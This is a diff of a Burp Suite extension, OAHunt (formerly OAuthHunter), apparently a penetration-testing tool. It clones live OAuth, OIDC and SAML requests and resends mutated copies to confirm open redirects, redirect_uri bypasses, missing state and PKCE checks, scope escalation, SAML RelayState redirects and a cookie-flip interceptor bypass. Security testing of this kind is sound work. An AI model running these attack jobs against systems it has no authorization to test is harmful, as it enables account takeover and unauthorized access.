@@ -1,58 +1,59 @@
 # -*- coding: utf-8 -*-
 """
-OAuthHunter v3.0 - OAuth/OIDC/SAML Exploit Confirmer
+OAHunt v3.2 - OAuth/OIDC/SAML Exploit Confirmer
 Burp Suite Extension - Jython 2.7
 
-DESIGN (like Authorize extension):
-  - Browser proxy flow passes through 100% UNTOUCHED - no restarts, no interference
-  - Extension clones every OAuth/SAML request into a background queue
-  - Each clone is mutated with attack payloads and sent as a SEPARATE request
-    via callbacks.makeHttpRequest() - completely independent of browser session
-  - Response is evaluated for exploitation proof
-  - Only CONFIRMED exploits appear in the findings table
-  - Zero false positives, zero browser disruption
+ROOT CAUSE FIX for '_main_panel' AttributeError:
+  - registerExtenderCallbacks runs on the EDT in Burp 2026
+  - invokeAndWait on EDT = deadlock
+  - invokeLater = race: addSuiteTab calls getUiComponent before UI is built
+  
+SOLUTION:
+  - Build UI entirely synchronously (no Swing threads) using plain JPanel construction
+  - No invokeLater, no invokeAndWait in registerExtenderCallbacks
+  - _main_panel is set before addSuiteTab is ever called
+  - Subsequent updates (findings, log) use invokeLater safely (from worker threads)
 
-Install: Extender > Extensions > Add > Type: Python > Jython 2.7
+Authorize-style design:
+  - Browser request flows through proxy UNTOUCHED
+  - processHttpMessage clones the request bytes, queues jobs, returns immediately  
+  - Jobs run in background ThreadPoolExecutor
+  - Only confirmed exploits appear in findings
 """
 
 from burp import IBurpExtender, IHttpListener, ITab, IExtensionStateListener
-from javax.swing import (JPanel, JTabbedPane, JTable, JScrollPane, JButton,
-                          JTextArea, JLabel, JSplitPane, JTextField,
-                          BorderFactory, SwingUtilities, JOptionPane,
-                          BoxLayout, SwingConstants, JCheckBox, JToggleButton,
-                          JPopupMenu, JMenuItem)
-from javax.swing.table import DefaultTableModel, DefaultTableCellRenderer
-from java.awt import (Color, Font, Dimension, BorderLayout, GridBagLayout,
-                       GridBagConstraints, Insets, FlowLayout)
-from java.awt.event import ActionListener, MouseAdapter, MouseEvent
+
+# Import Swing synchronously — safe at class definition time
+import javax.swing as swing
+import java.awt as awt
+from java.awt.event import ActionListener, MouseAdapter
 from java.lang import Runnable
 from java.util.concurrent import LinkedBlockingQueue, ThreadPoolExecutor, TimeUnit
+from javax.swing.table import DefaultTableModel, DefaultTableCellRenderer
 
 import json
-import base64
 import time
 
 # ── Colours ──────────────────────────────────
-C_BG      = Color(13,  17,  23)
-C_SURFACE = Color(22,  27,  34)
-C_BORDER  = Color(48,  54,  61)
-C_ACCENT  = Color(88,  166, 255)
-C_RED     = Color(248, 81,  73)
-C_GREEN   = Color(63,  185, 80)
-C_YELLOW  = Color(210, 153, 34)
-C_TEXT    = Color(201, 209, 217)
-C_MUTED   = Color(110, 118, 129)
-C_ORANGE  = Color(230, 120, 40)
+C_BG      = awt.Color(13,  17,  23)
+C_SURFACE = awt.Color(22,  27,  34)
+C_BORDER  = awt.Color(48,  54,  61)
+C_ACCENT  = awt.Color(88,  166, 255)
+C_GREEN   = awt.Color(63,  185, 80)
+C_YELLOW  = awt.Color(210, 153, 34)
+C_RED     = awt.Color(248, 81,  73)
+C_TEXT    = awt.Color(201, 209, 217)
+C_MUTED   = awt.Color(110, 118, 129)
 
 SEVERITY_COLORS = {
-    "CRITICAL": Color(255, 50,  50),
-    "HIGH":     Color(240, 100, 40),
-    "MEDIUM":   Color(210, 153, 34),
-    "LOW":      Color(63,  185, 80),
-    "INFO":     Color(88,  166, 255),
+    "CRITICAL": awt.Color(255, 50,  50),
+    "HIGH":     awt.Color(240, 100, 40),
+    "MEDIUM":   awt.Color(210, 153, 34),
+    "LOW":      awt.Color(63,  185, 80),
+    "INFO":     awt.Color(88,  166, 255),
 }
 
-# ── Detection triggers ────────────────────────
+# ── OAuth detection ───────────────────────────
 OAUTH_PARAMS = set([
     "response_type", "client_id", "redirect_uri", "scope", "state",
     "code", "access_token", "id_token", "grant_type", "code_verifier",
@@ -71,508 +72,375 @@ OAUTH_PATHS = [
 
 REDIRECT_PARAMS = [
     "redirect_uri", "returnTo", "return_to", "next", "redirect",
-    "goto", "continue", "url", "target", "dest", "postLogin",
-    "landingPage", "after_login", "callback", "redirect_url",
+    "goto", "continue", "url", "target", "dest",
+    "postLogin", "landingPage", "after_login", "callback", "redirect_url",
 ]
 
 CANARY = "oauthhunter-canary.example.com"
 
 
 # ─────────────────────────────────────────────
-# REQUEST CLONER
-# Clones a captured request into an independent
-# IHttpRequestResponse-compatible object for
-# makeHttpRequest — browser never sees this.
+# REQUEST CLONE
 # ─────────────────────────────────────────────
-class ClonedRequest(object):
-    def __init__(self, helpers, original_msg):
-        self._service = original_msg.getHttpService()
-        self._request = original_msg.getRequest()[:]   # byte[] copy
-        self._helpers = helpers
+class Clone(object):
+    def __init__(self, helpers, msg):
+        self._h       = helpers
+        self._service = msg.getHttpService()
+        self._bytes   = msg.getRequest()[:]
 
     def getHttpService(self):
         return self._service
 
     def getRequest(self):
-        return self._request
+        return self._bytes
 
-    def set_request(self, new_bytes):
-        self._request = new_bytes
+    def _params(self):
+        return self._h.analyzeRequest(
+            self._service, self._bytes).getParameters()
 
-    def get_analyzed(self):
-        return self._helpers.analyzeRequest(self._service, self._request)
+    def set_param(self, name, value):
+        for p in self._params():
+            if str(p.getName()) == name:
+                self._bytes = self._h.updateParameter(
+                    self._bytes,
+                    self._h.buildParameter(name, value, p.getType()))
+                return
+        self._bytes = self._h.addParameter(
+            self._bytes,
+            self._h.buildParameter(name, value, 0))
+
+    def del_param(self, name):
+        for p in self._params():
+            if str(p.getName()) == name:
+                self._bytes = self._h.removeParameter(self._bytes, p)
+                return
 
 
 # ─────────────────────────────────────────────
 # ATTACK JOBS
-# Each job = one cloned request + one mutation
-# Runs in thread pool, never blocks proxy thread
 # ─────────────────────────────────────────────
-
-class AttackJob(Runnable):
-    """Base class for all attack jobs."""
-
-    def __init__(self, ext, original_msg, param_map, host, path):
-        self.ext       = ext
-        self.original  = original_msg
-        self.param_map = param_map
-        self.host      = host
-        self.path      = path
+class Job(Runnable):
+    def __init__(self, ext, msg, pm, host, path):
+        self.ext  = ext
+        self.msg  = msg
+        self.pm   = pm
+        self.host = host
+        self.path = path
 
     def run(self):
         try:
-            self.execute()
+            self.go()
         except Exception as ex:
-            self.ext._log("Job error [{}]: {}".format(
+            self.ext._log("ERR [{}] {}".format(
                 self.__class__.__name__, str(ex)))
 
-    def execute(self):
-        pass  # override in subclasses
+    def go(self):
+        pass
 
     def clone(self):
-        """Return a fresh independent clone of the original request."""
-        return ClonedRequest(self.ext._helpers, self.original)
+        return Clone(self.ext._helpers, self.msg)
 
-    def send(self, cloned):
-        """Send the cloned (mutated) request independently."""
+    def fire(self, c):
         return self.ext._callbacks.makeHttpRequest(
-            cloned.getHttpService(), cloned.getRequest())
+            c.getHttpService(), c.getRequest())
 
-    def get_location(self, resp_bytes):
-        ar = self.ext._helpers.analyzeResponse(resp_bytes)
-        for h in ar.getHeaders():
-            if str(h).lower().startswith("location:"):
-                return str(h)[9:].strip()
+    def loc(self, r):
+        if not r or not r.getResponse():
+            return ""
+        for h in self.ext._helpers.analyzeResponse(
+                r.getResponse()).getHeaders():
+            s = str(h)
+            if s.lower().startswith("location:"):
+                return s[9:].strip()
         return ""
 
-    def get_status(self, resp_bytes):
-        return self.ext._helpers.analyzeResponse(resp_bytes).getStatusCode()
+    def st(self, r):
+        if not r or not r.getResponse():
+            return 0
+        return self.ext._helpers.analyzeResponse(r.getResponse()).getStatusCode()
 
-    def get_body(self, resp_bytes, limit=800):
+    def body(self, r, n=600):
+        if not r or not r.getResponse():
+            return ""
         try:
-            return self.ext._helpers.bytesToString(resp_bytes)[:limit]
+            return self.ext._helpers.bytesToString(r.getResponse())[:n]
         except Exception:
             return ""
 
-    def update_param(self, cloned, name, value, ptype=None):
-        h      = self.ext._helpers
-        req    = cloned.getRequest()
-        params = h.analyzeRequest(cloned.getHttpService(), req).getParameters()
-        for p in params:
-            if str(p.getName()) == name:
-                req = h.updateParameter(
-                    req, h.buildParameter(name, value, p.getType()))
-                cloned.set_request(req)
-                return True
-        # Not found — add as query param (type 0)
-        req = h.addParameter(req, h.buildParameter(name, value, 0))
-        cloned.set_request(req)
-        return False
+    def ok(self, r):
+        """Response is non-error."""
+        l = self.loc(r)
+        s = self.st(r)
+        return s > 0 and "error" not in l.lower() and "unauthorized" not in l.lower()
 
-    def remove_param(self, cloned, name):
-        h      = self.ext._helpers
-        req    = cloned.getRequest()
-        params = h.analyzeRequest(cloned.getHttpService(), req).getParameters()
-        for p in params:
-            if str(p.getName()) == name:
-                req = h.removeParameter(req, p)
-                cloned.set_request(req)
-                return True
-        return False
-
-    def report(self, name, severity, cwe, evidence):
+    def report(self, name, sev, cwe, evidence):
         self.ext._add_finding(
-            self.host, self.path, self.original,
-            name, severity, cwe, evidence)
+            self.host, self.path, self.msg,
+            name, sev, cwe, evidence)
 
 
-# ── Individual attack job classes ─────────────
+class JobOpenRedirect(Job):
+    def __init__(self, ext, msg, pm, host, path, pname):
+        Job.__init__(self, ext, msg, pm, host, path)
+        self.pname = pname
 
-class JobOpenRedirect(AttackJob):
-    """
-    Clone request, replace redirect param with CANARY domain.
-    Confirmed if Location header contains CANARY (server followed it).
-    Browser request passes through unchanged.
-    """
-    def __init__(self, ext, original_msg, param_map, host, path, param_name):
-        AttackJob.__init__(self, ext, original_msg, param_map, host, path)
-        self.param_name = param_name
-
-    def execute(self):
-        payloads = [
+    def go(self):
+        for payload in [
             "https://" + CANARY,
             "//" + CANARY,
             "https://" + CANARY + "%40" + self.host,
-        ]
-        for payload in payloads:
+        ]:
             c = self.clone()
-            self.update_param(c, self.param_name, payload)
-            resp = self.send(c)
-            if resp and resp.getResponse():
-                loc    = self.get_location(resp.getResponse())
-                status = self.get_status(resp.getResponse())
-                if status in (301, 302, 303, 307, 308):
-                    if (CANARY in loc or
-                            (loc.startswith("http") and
-                             self.host not in loc and
-                             "error" not in loc.lower())):
-                        self.report(
-                            "Open Redirect via '{}'".format(self.param_name),
-                            "HIGH", "CWE-601",
-                            "Cloned request with {}={}\n"
-                            "Server returned {} Location: {}".format(
-                                self.param_name, payload, status, loc[:120]))
-                        return
+            c.set_param(self.pname, payload)
+            r  = self.fire(c)
+            l  = self.loc(r)
+            s  = self.st(r)
+            if s in (301, 302, 303, 307, 308):
+                if (CANARY in l or
+                        (l.startswith("http") and
+                         self.host not in l and
+                         "error" not in l.lower())):
+                    self.report(
+                        "Open Redirect via '{}'".format(self.pname),
+                        "HIGH", "CWE-601",
+                        "Payload: {}={}\nServer {} -> {}".format(
+                            self.pname, payload, s, l[:120]))
+                    return
 
 
-class JobPrefixBypass(AttackJob):
-    """
-    Append query params / path traversal to whitelisted redirect_uri.
-    Confirmed if server accepts the modified URI (no error, or canary in Location).
-    """
-    def __init__(self, ext, original_msg, param_map, host, path, orig_redir):
-        AttackJob.__init__(self, ext, original_msg, param_map, host, path)
-        self.orig_redir = orig_redir
+class JobPrefixBypass(Job):
+    def __init__(self, ext, msg, pm, host, path, orig):
+        Job.__init__(self, ext, msg, pm, host, path)
+        self.orig = orig
 
-    def execute(self):
-        suffixes = [
-            "?next=https://"    + CANARY,
-            "?returnTo=https://" + CANARY,
-            "?redirect=https://" + CANARY,
+    def go(self):
+        for sfx in [
+            "?next=https://"      + CANARY,
+            "?returnTo=https://"  + CANARY,
+            "?redirect=https://"  + CANARY,
             "%3Fnext%3Dhttps%3A%2F%2F" + CANARY,
-            "#https://" + CANARY,
+            "#https://"           + CANARY,
             "/../../../evil",
             "%2f..%2f..%2fevil",
-        ]
-        for suffix in suffixes:
-            payload = self.orig_redir + suffix
+        ]:
             c = self.clone()
-            self.update_param(c, "redirect_uri", payload)
-            resp = self.send(c)
-            if resp and resp.getResponse():
-                loc    = self.get_location(resp.getResponse())
-                status = self.get_status(resp.getResponse())
-                body   = self.get_body(resp.getResponse())
-
-                # Confirmed: prefix match accepted, no error
-                if status in (301, 302, 303) and "error" not in loc.lower():
-                    if CANARY in loc or "code=" in loc:
-                        self.report(
-                            "redirect_uri Prefix Match Bypass",
-                            "HIGH", "CWE-183",
-                            "Suffix '{}' appended to redirect_uri was accepted.\n"
-                            "Status: {} Location: {}".format(
-                                suffix, status, loc[:120]))
-                        return
-
-                # Also report if error reveals the modified URI was attempted
-                if ("error_description" in body and
-                        (CANARY in body or "not in the list" in body)):
+            c.set_param("redirect_uri", self.orig + sfx)
+            r = self.fire(c)
+            l = self.loc(r)
+            s = self.st(r)
+            b = self.body(r)
+            if s in (301, 302, 303) and "error" not in l.lower():
+                if CANARY in l or "code=" in l:
                     self.report(
-                        "redirect_uri Prefix Match Bypass (Partial)",
-                        "MEDIUM", "CWE-183",
-                        "Server attempted redirect to modified URI.\n"
-                        "error_description reveals: {}".format(
-                            body[body.find("error_description"):
-                                 body.find("error_description") + 200]))
+                        "redirect_uri Prefix Match Bypass",
+                        "HIGH", "CWE-183",
+                        "Suffix '{}' accepted.\nStatus:{} Location:{}".format(
+                            sfx, s, l[:120]))
                     return
-
-
-class JobStateCsrf(AttackJob):
-    """
-    Remove state param from cloned request.
-    Confirmed if server still issues code/token (CSRF is possible).
-    """
-    def execute(self):
-        if "state" not in self.param_map:
-            return
-        c = self.clone()
-        self.remove_param(c, "state")
-        resp = self.send(c)
-        if resp and resp.getResponse():
-            loc    = self.get_location(resp.getResponse())
-            status = self.get_status(resp.getResponse())
-            if status in (200, 301, 302) and "error" not in loc.lower():
-                if "code=" in loc or "token=" in loc or status == 200:
-                    self.report(
-                        "Missing State — CSRF Login Attack Confirmed",
-                        "HIGH", "CWE-352",
-                        "Cloned request sent WITHOUT state param.\n"
-                        "Server accepted it. Status: {} Location: {}".format(
-                            status, loc[:100]))
-
-
-class JobPkceMissing(AttackJob):
-    """
-    Strip code_challenge from cloned code-flow request.
-    Confirmed if server still returns auth code.
-    """
-    def execute(self):
-        if self.param_map.get("response_type") != "code":
-            return
-        if "code_challenge" not in self.param_map:
-            return  # wasn't using PKCE to begin with
-        c = self.clone()
-        self.remove_param(c, "code_challenge")
-        self.remove_param(c, "code_challenge_method")
-        resp = self.send(c)
-        if resp and resp.getResponse():
-            loc    = self.get_location(resp.getResponse())
-            status = self.get_status(resp.getResponse())
-            if status in (301, 302) and "code=" in loc and "error" not in loc.lower():
+            if "error_description" in b and CANARY in b:
                 self.report(
-                    "PKCE Bypass — Auth Code Issued Without Verifier",
-                    "MEDIUM", "CWE-345",
-                    "Cloned request stripped code_challenge.\n"
-                    "Server still returned code. Location: {}".format(loc[:120]))
+                    "redirect_uri Prefix Bypass (whitelist exposed in error)",
+                    "MEDIUM", "CWE-183",
+                    "Server attempted redirect to modified URI.\n{}".format(
+                        b[:300]))
+                return
 
 
-class JobScopeEscalation(AttackJob):
-    """
-    Replace scope with elevated values in clone.
-    Confirmed if server grants elevated scope without error.
-    """
-    def execute(self):
-        if "scope" not in self.param_map:
+class JobStateCsrf(Job):
+    def go(self):
+        if "state" not in self.pm:
             return
-        orig = self.param_map["scope"]
-        tests = [
-            orig + " admin",
-            orig + " offline_access",
-            "openid profile email admin",
-            "admin",
-        ]
-        for scope in tests:
+        c = self.clone()
+        c.del_param("state")
+        r = self.fire(c)
+        l = self.loc(r)
+        s = self.st(r)
+        if s in (200, 301, 302) and "error" not in l.lower():
+            if "code=" in l or "token=" in l or s == 200:
+                self.report(
+                    "Missing State — CSRF Login Confirmed",
+                    "HIGH", "CWE-352",
+                    "Request sent WITHOUT state. Server accepted.\n"
+                    "Status:{} Location:{}".format(s, l[:100]))
+
+
+class JobPkce(Job):
+    def go(self):
+        if (self.pm.get("response_type") != "code" or
+                "code_challenge" not in self.pm):
+            return
+        c = self.clone()
+        c.del_param("code_challenge")
+        c.del_param("code_challenge_method")
+        r = self.fire(c)
+        l = self.loc(r)
+        s = self.st(r)
+        if s in (301, 302) and "code=" in l and "error" not in l.lower():
+            self.report(
+                "PKCE Bypass — Code Issued Without Verifier",
+                "MEDIUM", "CWE-345",
+                "Stripped code_challenge. Server still returned code.\n"
+                "Location:{}".format(l[:120]))
+
+
+class JobScope(Job):
+    def go(self):
+        if "scope" not in self.pm or "response_type" not in self.pm:
+            return
+        orig = self.pm["scope"]
+        for scope in [orig + " admin", orig + " offline_access",
+                      "openid profile email admin", "admin"]:
             c = self.clone()
-            self.update_param(c, "scope", scope)
-            resp = self.send(c)
-            if resp and resp.getResponse():
-                loc    = self.get_location(resp.getResponse())
-                status = self.get_status(resp.getResponse())
-                body   = self.get_body(resp.getResponse())
-                if status in (200, 302) and "error" not in loc.lower():
-                    if "code=" in loc or "access_token" in body:
-                        self.report(
-                            "OAuth Scope Escalation Confirmed",
-                            "HIGH", "CWE-269",
-                            "Cloned request with scope='{}' accepted.\n"
-                            "Status: {} Location: {}".format(
-                                scope, status, loc[:100]))
-                        return
-
-
-class JobRedirectParamInjection(AttackJob):
-    """
-    Inject internal paths into post-auth redirect params.
-    Confirmed if server 302s to the injected path.
-    """
-    def __init__(self, ext, original_msg, param_map, host, path, param_name):
-        AttackJob.__init__(self, ext, original_msg, param_map, host, path)
-        self.param_name = param_name
-
-    def execute(self):
-        for dest in ["/admin", "/admin/users", "/manage", "/config",
-                     "https://" + CANARY]:
-            c = self.clone()
-            self.update_param(c, self.param_name, dest)
-            resp = self.send(c)
-            if resp and resp.getResponse():
-                loc    = self.get_location(resp.getResponse())
-                status = self.get_status(resp.getResponse())
-                if status in (301, 302, 303) and dest in loc:
+            c.set_param("scope", scope)
+            r = self.fire(c)
+            l = self.loc(r)
+            s = self.st(r)
+            b = self.body(r)
+            if s in (200, 302) and "error" not in l.lower():
+                if "code=" in l or "access_token" in b:
                     self.report(
-                        "Post-Auth Redirect Injection via '{}'".format(
-                            self.param_name),
-                        "HIGH", "CWE-601",
-                        "Cloned request with {}={}\n"
-                        "Server redirected to: {}".format(
-                            self.param_name, dest, loc[:120]))
+                        "Scope Escalation Confirmed",
+                        "HIGH", "CWE-269",
+                        "scope='{}' accepted.\nStatus:{} Location:{}".format(
+                            scope, s, l[:100]))
                     return
-                if status == 200 and dest == "/admin":
-                    body = self.get_body(resp.getResponse())
-                    if "admin" in body.lower():
-                        self.report(
-                            "Post-Auth Redirect Injection via '{}'".format(
-                                self.param_name),
-                            "HIGH", "CWE-601",
-                            "Cloned request with {}={} returned 200 with admin content.".format(
-                                self.param_name, dest))
-                        return
 
 
-class JobG2gBypass(AttackJob):
-    """
-    Clone a request to a protected page, flip g2g/eg2g cookies to false.
-    Confirmed if 200 returned without intercept page.
-    Completely independent of browser — browser still has g2g=true.
-    """
-    def __init__(self, ext, original_msg, param_map, host, path, cookies):
-        AttackJob.__init__(self, ext, original_msg, param_map, host, path)
+class JobRedirectInject(Job):
+    def __init__(self, ext, msg, pm, host, path, pname):
+        Job.__init__(self, ext, msg, pm, host, path)
+        self.pname = pname
+
+    def go(self):
+        for dest in ["/admin", "/admin/users",
+                     "/manage", "https://" + CANARY]:
+            c = self.clone()
+            c.set_param(self.pname, dest)
+            r = self.fire(c)
+            l = self.loc(r)
+            s = self.st(r)
+            if s in (301, 302, 303) and dest in l:
+                self.report(
+                    "Post-Auth Redirect Injection via '{}'".format(self.pname),
+                    "HIGH", "CWE-601",
+                    "{}={}\nServer -> {}".format(self.pname, dest, l[:120]))
+                return
+
+
+class JobG2g(Job):
+    def __init__(self, ext, msg, pm, host, path, cookies):
+        Job.__init__(self, ext, msg, pm, host, path)
         self.cookies = cookies
 
-    def execute(self):
+    def go(self):
         if not any(k.lower() in ("g2g", "eg2g")
                    for k in self.cookies.keys()):
             return
-
-        test_paths = ["/en/dashboard.html", "/en/profile/manage",
-                      "/dombff-profile/profile", "/en/admin"]
-
-        for tpath in test_paths:
-            for g2g_val in ["false", "0", ""]:
-                h = self.ext._helpers
-
-                # Build cookie string with flipped g2g
-                cookie_parts = []
-                for name, val in self.cookies.items():
-                    if name.lower() == "g2g":
-                        cookie_parts.append("g2g=" + g2g_val)
-                    elif name.lower() == "eg2g":
-                        cookie_parts.append("eg2g=" + g2g_val)
+        h = self.ext._helpers
+        for tpath in ["/en/dashboard.html", "/en/profile/manage",
+                      "/dombff-profile/profile", "/en/admin"]:
+            for gval in ["false", "0", ""]:
+                parts = []
+                for k, v in self.cookies.items():
+                    if k.lower() == "g2g":
+                        parts.append("g2g=" + gval)
+                    elif k.lower() == "eg2g":
+                        parts.append("eg2g=" + gval)
                     else:
-                        cookie_parts.append("{}={}".format(name, val))
-
-                raw = ("GET {} HTTP/1.1\r\n"
-                       "Host: {}\r\n"
-                       "Cookie: {}\r\n"
-                       "User-Agent: Mozilla/5.0 OAuthHunter\r\n"
-                       "Accept: text/html,*/*\r\n"
-                       "Connection: close\r\n\r\n").format(
-                    tpath, self.host, "; ".join(cookie_parts))
-
+                        parts.append("{}={}".format(k, v))
+                raw = ("GET {} HTTP/1.1\r\nHost: {}\r\n"
+                       "Cookie: {}\r\nUser-Agent: OAuthHunter\r\n"
+                       "Accept: text/html\r\nConnection: close\r\n\r\n"
+                       ).format(tpath, self.host, "; ".join(parts))
                 try:
                     resp = self.ext._callbacks.makeHttpRequest(
-                        self.original.getHttpService(),
-                        h.stringToBytes(raw))
-                    if resp and resp.getResponse():
-                        loc    = self.get_location(resp.getResponse())
-                        status = self.get_status(resp.getResponse())
-                        body   = self.get_body(resp.getResponse())
-
-                        if status == 200 and "intercept" not in body.lower():
-                            self.report(
-                                "Post-Login Interceptor (g2g) Bypass Confirmed",
-                                "CRITICAL", "CWE-284",
-                                "Cloned request to {} with g2g={}\n"
-                                "Server returned 200 WITHOUT intercept page.\n"
-                                "Browser session was NOT affected.".format(
-                                    tpath, g2g_val))
-                            return
-                        if (status in (301, 302) and
-                                "intercept" not in loc.lower()):
-                            self.report(
-                                "Post-Login Interceptor (g2g) Bypass Confirmed",
-                                "CRITICAL", "CWE-284",
-                                "Cloned request to {} with g2g={}\n"
-                                "Redirected to {} (not intercept page).".format(
-                                    tpath, g2g_val, loc[:80]))
-                            return
+                        self.msg.getHttpService(), h.stringToBytes(raw))
+                    l = self.loc(resp)
+                    s = self.st(resp)
+                    b = self.body(resp)
+                    if s == 200 and "intercept" not in b.lower():
+                        self.report(
+                            "g2g Interceptor Bypass Confirmed",
+                            "CRITICAL", "CWE-284",
+                            "GET {} with g2g={}\n"
+                            "200 OK without intercept page.".format(tpath, gval))
+                        return
+                    if s in (301, 302) and "intercept" not in l.lower() and l:
+                        self.report(
+                            "g2g Interceptor Bypass Confirmed",
+                            "CRITICAL", "CWE-284",
+                            "GET {} with g2g={}\n"
+                            "Redirected to {}".format(tpath, gval, l[:80]))
+                        return
                 except Exception:
                     pass
 
 
-class JobSamlRelayState(AttackJob):
-    """
-    Replace RelayState with CANARY in clone.
-    Confirmed if Location contains CANARY.
-    """
-    def execute(self):
-        if "RelayState" not in self.param_map:
+class JobSaml(Job):
+    def go(self):
+        if "RelayState" not in self.pm:
             return
         for payload in ["https://" + CANARY, "//" + CANARY, "/admin"]:
             c = self.clone()
-            self.update_param(c, "RelayState", payload)
-            resp = self.send(c)
-            if resp and resp.getResponse():
-                loc    = self.get_location(resp.getResponse())
-                status = self.get_status(resp.getResponse())
-                if (CANARY in loc or "/admin" in loc or
-                        (status in (301, 302) and payload in loc)):
-                    self.report(
-                        "SAML RelayState Open Redirect Confirmed",
-                        "HIGH", "CWE-601",
-                        "Cloned RelayState={}\n"
-                        "Server redirected to: {}".format(payload, loc[:120]))
-                    return
+            c.set_param("RelayState", payload)
+            r = self.fire(c)
+            l = self.loc(r)
+            s = self.st(r)
+            if CANARY in l or "/admin" in l or payload in l:
+                self.report(
+                    "SAML RelayState Redirect Confirmed",
+                    "HIGH", "CWE-601",
+                    "RelayState={}\nServer -> {}".format(payload, l[:120]))
+                return
 
 
-class JobCookieFlags(object):
-    """
-    Not a proxy job — called directly from response handler.
-    Checks ONLY critical auth cookies for missing flags.
-    Certain finding, no HTTP request needed.
-    """
-    CRITICAL_COOKIES = set([
-        "auth0", "auth0_compat", "access_token", "id_token",
-        "session", "sid", "token",
-    ])
-
-    @staticmethod
-    def check(cookie_header):
-        if not cookie_header.lower().startswith("set-cookie:"):
-            return None, None
-        parts = cookie_header[11:].strip()
-        name  = parts.split("=")[0].strip().lower()
-        low   = parts.lower()
-        if name not in JobCookieFlags.CRITICAL_COOKIES:
-            return None, None
-        missing = []
-        if "httponly" not in low: missing.append("HttpOnly")
-        if "secure"   not in low: missing.append("Secure")
-        if "samesite" not in low: missing.append("SameSite")
-        if missing:
-            return (
-                "Auth Cookie '{}' Missing: {}".format(name, ", ".join(missing)),
-                "Cookie '{}' confirmed missing flags: {}".format(
-                    name, ", ".join(missing))
-            )
-        return None, None
-
-
-# ── Non-editable table model ──────────────────
-class ReadOnlyTableModel(DefaultTableModel):
-    def isCellEditable(self, row, col):
+# ─────────────────────────────────────────────
+# TABLE MODEL
+# ─────────────────────────────────────────────
+class ROModel(DefaultTableModel):
+    def isCellEditable(self, r, c):
         return False
 
 
-# ── Cell renderer ─────────────────────────────
-class SeverityRenderer(DefaultTableCellRenderer):
-    def getTableCellRendererComponent(self, table, value, isSelected,
-                                       hasFocus, row, col):
-        c = DefaultTableCellRenderer.getTableCellRendererComponent(
-            self, table, value, isSelected, hasFocus, row, col)
-        if col == 2:
-            self.setForeground(SEVERITY_COLORS.get(str(value), C_TEXT))
-            self.setFont(Font("Monospaced", Font.BOLD, 11))
+class SevRenderer(DefaultTableCellRenderer):
+    def getTableCellRendererComponent(self, t, v, sel, foc, r, c):
+        comp = DefaultTableCellRenderer.getTableCellRendererComponent(
+            self, t, v, sel, foc, r, c)
+        if c == 2:
+            self.setForeground(SEVERITY_COLORS.get(str(v), C_TEXT))
+            self.setFont(awt.Font("Monospaced", awt.Font.BOLD, 11))
         else:
             self.setForeground(C_TEXT)
-            self.setFont(Font("Monospaced", Font.PLAIN, 11))
-        self.setBackground(C_SURFACE if not isSelected else C_ACCENT.darker())
-        return c
+            self.setFont(awt.Font("Monospaced", awt.Font.PLAIN, 11))
+        self.setBackground(C_SURFACE if not sel else C_ACCENT.darker())
+        return comp
 
 
-# ── Runnable UI helpers ───────────────────────
-class AddFindingRow(Runnable):
-    def __init__(self, ext, finding):
-        self.ext     = ext
-        self.finding = finding
+# ─────────────────────────────────────────────
+# SWING RUNNABLES (called from worker threads)
+# ─────────────────────────────────────────────
+class RAddRow(Runnable):
+    def __init__(self, ext, f):
+        self.ext = ext
+        self.f   = f
 
     def run(self):
-        f = self.finding
-        self.ext._findings_model.addRow([
+        f = self.f
+        self.ext._model.addRow([
             f["timestamp"], f["host"], f["severity"],
             f["name"], f["path"][:60], f["cwe"]
         ])
-        # Flash findings tab title
         try:
-            count = len(self.ext.all_findings)
-            self.ext._tabs.setTitleAt(
-                0, "Findings ({})".format(count))
+            n = len(self.ext.all_findings)
+            self.ext._tabs.setTitleAt(0, "Findings ({})".format(n))
+            self.ext._ctr.setText(
+                "  Scanned: {}  Findings: {}".format(
+                    self.ext._scanned, n))
         except Exception:
             pass
 
 
-class AppendLog(Runnable):
+class RLog(Runnable):
     def __init__(self, ext, line):
         self.ext  = ext
         self.line = line
@@ -586,173 +454,405 @@ class AppendLog(Runnable):
             pass
 
 
-class IncrementCounter(Runnable):
+class RCounter(Runnable):
     def __init__(self, ext):
         self.ext = ext
 
     def run(self):
         try:
-            self.ext._scan_count += 1
-            self.ext._counter_lbl.setText(
-                "  Requests scanned: {}  |  Findings: {}  |  Queue: {}".format(
-                    self.ext._scan_count,
-                    len(self.ext.all_findings),
-                    self.ext._queue.size() if self.ext._queue else 0))
+            self.ext._ctr.setText(
+                "  Scanned: {}  Findings: {}".format(
+                    self.ext._scanned, len(self.ext.all_findings)))
         except Exception:
             pass
 
 
-# ── Action listeners ──────────────────────────
-class ToggleAction(ActionListener):
+# ─────────────────────────────────────────────
+# ACTION LISTENERS
+# ─────────────────────────────────────────────
+class AToggle(ActionListener):
     def __init__(self, ext, btn):
         self.ext = ext
         self.btn = btn
 
-    def actionPerformed(self, evt):
+    def actionPerformed(self, e):
         self.ext._active = self.btn.isSelected()
         if self.ext._active:
-            self.btn.setText("ON  - Click to Disable")
+            self.btn.setText("ACTIVE — click to pause")
             self.btn.setForeground(C_GREEN)
-            self.ext._status_lbl.setText("Status: ACTIVE — scanning OAuth flows")
-            self.ext._status_lbl.setForeground(C_GREEN)
         else:
-            self.btn.setText("OFF - Click to Enable")
-            self.btn.setForeground(C_MUTED)
-            self.ext._status_lbl.setText("Status: PAUSED")
-            self.ext._status_lbl.setForeground(C_MUTED)
+            self.btn.setText("PAUSED — click to resume")
+            self.btn.setForeground(C_YELLOW)
 
 
-class ClearAction(ActionListener):
+class AClear(ActionListener):
     def __init__(self, ext):
         self.ext = ext
 
-    def actionPerformed(self, evt):
-        e = self.ext
-        e.all_findings = []
-        e.tested.clear()
-        e._scan_count = 0
-        e._findings_model.setRowCount(0)
+    def actionPerformed(self, e):
+        self.ext.all_findings = []
+        self.ext.tested.clear()
+        self.ext._scanned = 0
+        self.ext._model.setRowCount(0)
         try:
-            e._tabs.setTitleAt(0, "Findings (0)")
+            self.ext._tabs.setTitleAt(0, "Findings (0)")
+            self.ext._ctr.setText("  Scanned: 0  Findings: 0")
         except Exception:
             pass
-        e._log("Cleared.")
 
 
-class ExportAction(ActionListener):
+class AExport(ActionListener):
     def __init__(self, ext):
         self.ext = ext
 
-    def actionPerformed(self, evt):
+    def actionPerformed(self, e):
         try:
             data = [{k: v for k, v in f.items() if k != "messageInfo"}
                     for f in self.ext.all_findings]
             path = "/tmp/oauthhunter_confirmed.json"
             with open(path, "w") as fp:
                 json.dump(data, fp, indent=2, default=str)
-            self.ext._log("Exported {} findings to {}".format(len(data), path))
